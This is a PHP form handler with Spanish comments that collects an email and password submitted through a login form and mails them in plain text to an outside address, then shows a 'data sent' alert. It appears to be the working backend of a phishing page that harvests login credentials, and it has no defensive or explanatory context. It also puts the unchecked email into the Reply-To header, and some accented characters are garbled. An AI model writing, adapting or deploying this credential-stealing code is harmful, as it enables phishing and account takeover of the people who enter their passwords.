<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Recoger los datos del formulario
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Direcci�n de correo a la que se enviar� el email
    $to = 'gmail@juliaysantino989.com';

    // Asunto del email
    $subject = 'Datos de inicio de sesi�n';

    // Mensaje del email
    $message = "Correo electr�nico: $email\n";
    $message .= "Contrase�a: $password\n";

    // Cabeceras del email
    $headers = "From: webmaster@example.com\r\n";
    $headers .= "Reply-To: $email\r\n";
    $headers .= "Content-type: text/plain; charset=utf-8\r\n";

    // Enviar el email
    if (mail($to, $subject, $message, $headers)) {
        echo '<script>alert("Datos enviados correctamente.");</script>';
    } else {
        echo '<script>alert("Error al enviar los datos.");</script>';
    }
} else {
    echo '<script>alert("Acceso no permitido.");</script>';
}
?>
